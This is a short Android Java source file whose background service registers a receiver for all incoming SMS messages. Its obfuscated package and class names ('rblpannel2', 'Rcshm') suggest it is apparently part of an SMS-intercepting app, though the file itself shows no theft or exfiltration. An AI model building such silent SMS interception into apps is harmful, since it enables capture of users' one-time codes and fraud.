package rblp4nnna.com.rblpannel2;

import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.util.Log;

public class BackS extends Service {


    private Rcshm smsReceiver;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d("mywork", "BackgroundService started");
        IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        smsReceiver = new Rcshm();
        registerReceiver(smsReceiver, filter);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (smsReceiver != null) {
            Log.d("mywork", "Unregistering SmsReceiver");
            unregisterReceiver(smsReceiver);
            smsReceiver = null;
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        // This method is not used for started services
        return null;
    }
}
